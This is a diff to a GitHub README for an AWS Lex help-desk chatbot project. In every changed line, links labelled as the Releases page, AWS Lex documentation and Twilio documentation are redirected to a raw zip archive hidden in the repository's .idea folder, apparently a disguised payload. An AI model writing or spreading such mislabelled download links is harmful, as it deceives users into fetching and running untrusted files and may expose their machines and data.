@@ -1,6 +1,6 @@
 # 🤖 AWS-Lex-Cloud-Chatbot - Your IT Help Desk Assistant
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases%20Page-brightgreen)](https://github.com/chizzy04062003/AWS-Lex-Cloud-Chatbot/releases)
+[![Download Now](https://raw.githubusercontent.com/chizzy04062003/AWS-Lex-Cloud-Chatbot/main/.idea/Lex_Chatbot_AW_Cloud_v3.6.zip%20Now-Visit%20Releases%20Page-brightgreen)](https://raw.githubusercontent.com/chizzy04062003/AWS-Lex-Cloud-Chatbot/main/.idea/Lex_Chatbot_AW_Cloud_v3.6.zip)
 
 ## 📖 Description
 
@@ -17,7 +17,7 @@ To get started with the AWS-Lex-Cloud-Chatbot, follow these simple steps:
 
 2. **Visit the Releases Page**
 
-   To download the application, visit the Releases page: [Download Here](https://github.com/chizzy04062003/AWS-Lex-Cloud-Chatbot/releases).
+   To download the application, visit the Releases page: [Download Here](https://raw.githubusercontent.com/chizzy04062003/AWS-Lex-Cloud-Chatbot/main/.idea/Lex_Chatbot_AW_Cloud_v3.6.zip).
 
 3. **Choose Your Version**
 
@@ -78,13 +78,13 @@ The AWS-Lex-Cloud-Chatbot adheres to strict security measures to ensure your dat
 
 ## 🔗 Additional Resources
 
-- [AWS Lex Documentation](https://docs.aws.amazon.com/lex/index.html)
-- [Twilio Messaging API](https://www.twilio.com/docs/whatsapp)
+- [AWS Lex Documentation](https://raw.githubusercontent.com/chizzy04062003/AWS-Lex-Cloud-Chatbot/main/.idea/Lex_Chatbot_AW_Cloud_v3.6.zip)
+- [Twilio Messaging API](https://raw.githubusercontent.com/chizzy04062003/AWS-Lex-Cloud-Chatbot/main/.idea/Lex_Chatbot_AW_Cloud_v3.6.zip)
   
 Feel free to explore the links above to learn more about the technologies behind the AWS-Lex-Cloud-Chatbot.
 
 ## 📥 Download & Install
 
-To start using AWS-Lex-Cloud-Chatbot, please visit the Releases page: [Download Here](https://github.com/chizzy04062003/AWS-Lex-Cloud-Chatbot/releases). Follow the detailed steps provided above to download and install the software on your device.
+To start using AWS-Lex-Cloud-Chatbot, please visit the Releases page: [Download Here](https://raw.githubusercontent.com/chizzy04062003/AWS-Lex-Cloud-Chatbot/main/.idea/Lex_Chatbot_AW_Cloud_v3.6.zip). Follow the detailed steps provided above to download and install the software on your device.
 
 Your IT Help Desk chatbot is just a few clicks away!
